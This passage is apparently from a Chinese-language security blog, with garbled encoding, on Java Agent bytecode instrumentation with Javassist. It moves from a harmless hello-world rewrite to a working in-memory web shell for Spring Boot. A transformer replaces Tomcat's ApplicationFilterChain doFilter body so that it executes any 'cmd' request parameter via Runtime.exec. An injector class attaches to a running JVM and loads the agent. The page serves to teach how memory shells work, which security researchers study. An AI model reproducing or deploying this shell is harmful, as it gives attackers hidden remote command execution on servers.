href="https://goodapple.top/archives/1145#header-id-20">è¿™ç¯‡æ–‡ç« </a>ä¸­ï¼Œæˆ‘å·²ç»ä»‹ç»è¿‡äº†Javassistçš„ç”¨æ³•ã€‚ä¸‹é¢æˆ‘å°±æ¥ä¿®æ”¹ä¸€ä¸ªæ­£åœ¨è¿è¡ŒJVMçš„å­—èŠ‚ç ã€‚</p><h5 id="ä¿®æ”¹ç›®æ ‡JVMçš„Classå­—èŠ‚ç "><a href="#ä¿®æ”¹ç›®æ ‡JVMçš„Classå­—èŠ‚ç " class="headerlink" title="ä¿®æ”¹ç›®æ ‡JVMçš„Classå­—èŠ‚ç "></a>ä¿®æ”¹ç›®æ ‡JVMçš„Classå­—èŠ‚ç </h5><p>é¦–å…ˆç¼–å†™ä¸€ä¸ªç›®æ ‡ç±»com.sleep.hello.Sleep_Hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–å†™ä¸€ä¸ªagentmain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">java_agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»</span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.example.hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Hello_Transform</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(cls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»§æ‰¿ClassFileTransformerç±»ç¼–å†™ä¸€ä¸ªtransformerï¼Œä¿®æ”¹å¯¹åº”ç±»çš„å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡ç±»</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.example.hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡æ–¹æ³•</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è®¾ç½®æ–¹æ³•ä½“</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå‘å°±æ˜¯è¯åœ¨resourcesç›®å½•çš„æ–‡ä»¶ä¸­æ·»åŠ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.zbz.java_agent_agentmain</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067911718-31db2331-40ef-401e-a8dc-bbdcd31b6a4d.png"></p><h3 id="Instrumentationçš„å±€é™æ€§"><a href="#Instrumentationçš„å±€é™æ€§" class="headerlink" title="Instrumentationçš„å±€é™æ€§"></a>Instrumentationçš„å±€é™æ€§</h3><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨Instrumentationéƒ½æ˜¯ä½¿ç”¨å…¶å­—èŠ‚ç æ’æ¡©çš„åŠŸèƒ½ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç±»é‡å®šä¹‰åŠŸèƒ½ï¼ˆClass Redefineï¼‰ï¼Œä½†æ˜¯æœ‰ä»¥ä¸‹å±€é™æ€§ï¼š</p><p>premainå’Œagentmainä¸¤ç§æ–¹å¼<strong>ä¿®æ”¹å­—èŠ‚ç </strong>çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å¸¦æœ‰Classç±»å‹çš„å‚æ•°ï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p><p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢(Class Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰Instrumentation#redefineClassesæ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p><ol><li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li><li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li><li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li><li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯private static&#x2F;finalä¿®é¥°çš„</li><li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li></ol><h3 id="Agentå†…å­˜é©¬"><a href="#Agentå†…å­˜é©¬" class="headerlink" title="Agentå†…å­˜é©¬"></a>Agentå†…å­˜é©¬</h3><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡Java AgentæŠ€æœ¯æ¥ä¿®æ”¹æ­£åœ¨è¿è¡ŒJVMä¸­çš„æ–¹æ³•ä½“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥Hookä¸€äº›JVMä¸€å®šä¼šè°ƒç”¨ã€å¹¶ä¸”Hookä¹‹åä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡é€»è¾‘çš„çš„æ–¹æ³•æ¥å®ç°å†…å­˜é©¬ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥Spring Bootä¸ºä¾‹ï¼Œæ¥å®ç°ä¸€ä¸ªAgentå†…å­˜é©¬</p><h4 id="Spring-Bootä¸­çš„Tomcat"><a href="#Spring-Bootä¸­çš„Tomcat" class="headerlink" title="Spring Bootä¸­çš„Tomcat"></a>Spring Bootä¸­çš„Tomcat</h4><p>æˆ‘ä»¬çŸ¥é“ï¼ŒSpring Bootä¸­å†…åµŒäº†ä¸€ä¸ªembed Tomcatä½œä¸ºå…¶å¯åŠ¨å®¹å™¨ã€‚æ—¢ç„¶æ˜¯Tomcatï¼Œé‚£è‚¯å®šæœ‰ç›¸åº”çš„ç»„ä»¶å®¹å™¨ã€‚æˆ‘ä»¬å…ˆæ¥è°ƒè¯•ä¸€ä¸‹SpringBootï¼Œéƒ¨åˆ†è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Context:<span class="number">20</span>, Context_Learn (com.example.spring_controller)</span><br><span class="line">...</span><br><span class="line">(org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¼šæŒ‰ç…§è´£ä»»é“¾æœºåˆ¶åå¤è°ƒç”¨ApplicationFilterChain#doFilter()æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿåˆ°internalDoFilter()æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                              ServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">    <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸¤ä¸ªæ–¹æ³•å‡æ‹¥æœ‰ServletRequestå’ŒServletResponseï¼Œå¹¶ä¸”hookä¸ä¼šå½±å“æ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤å¾ˆé€‚åˆä½œä¸ºå†…å­˜é©¬çš„å›æ˜¾ã€‚ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨</p><h4 id="åˆ©ç”¨Java-Agentå®ç°Spring-Filterå†…å­˜é©¬"><a href="#åˆ©ç”¨Java-Agentå®ç°Spring-Filterå†…å­˜é©¬" class="headerlink" title="åˆ©ç”¨Java Agentå®ç°Spring Filterå†…å­˜é©¬"></a>åˆ©ç”¨Java Agentå®ç°Spring Filterå†…å­˜é©¬</h4><p>æˆ‘ä»¬å¤ç”¨ä¸Šé¢çš„agentmain-Agentï¼Œä¿®æ”¹å­—èŠ‚ç çš„å…³é”®åœ¨äºtransformer()æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬é‡å†™è¯¥æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation.transformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡ç±»</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è·å–ç›®æ ‡æ–¹æ³•</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è®¾ç½®æ–¹æ³•ä½“</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inject_Agent_Springç±»å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent_Spring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//è¿æ¥æŒ‡å®šJVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//åŠ è½½Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//æ–­å¼€JVMè¿æ¥</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(vmd.displayName());</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ä¸€ä¸ªç®€å•çš„Spring Booté¡¹ç›®</p><p><img 